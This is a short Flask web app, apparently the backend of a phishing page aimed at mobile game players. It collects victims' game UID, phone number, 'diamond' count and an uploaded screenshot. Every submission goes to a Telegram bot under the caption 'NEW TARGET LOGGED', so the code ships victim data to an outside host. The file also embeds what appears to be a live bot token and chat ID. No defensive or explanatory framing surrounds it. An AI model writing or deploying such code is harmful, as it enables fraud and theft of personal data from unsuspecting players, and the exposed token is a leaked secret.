from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)

# CONFIG - Apna details check kar lo
BOT_TOKEN = "8480955083:AAFVIXXvXmbt7irxXTUte3ppItRDwn_0CXA"
CHAT_ID = "8037300335"

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/send_data', methods=['POST'])
def send_data():
    uid = request.form.get('uid')
    phone = request.form.get('phone')
    diamonds = request.form.get('diamonds')
    screenshot = request.files.get('screenshot')

    caption = f"🔥 *NEW TARGET LOGGED*\n\n🆔 UID: `{uid}`\n📞 No: `{phone}`\n💎 Diamonds: `{diamonds}`\n✅ Status: *Screenshot Uploaded*"

    if screenshot:
        files = {'photo': screenshot.read()}
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto?chat_id={CHAT_ID}&caption={caption}&parse_mode=Markdown", files=files)
    else:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": caption, "parse_mode": "Markdown"})
    
    return jsonify({"status": "success"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)

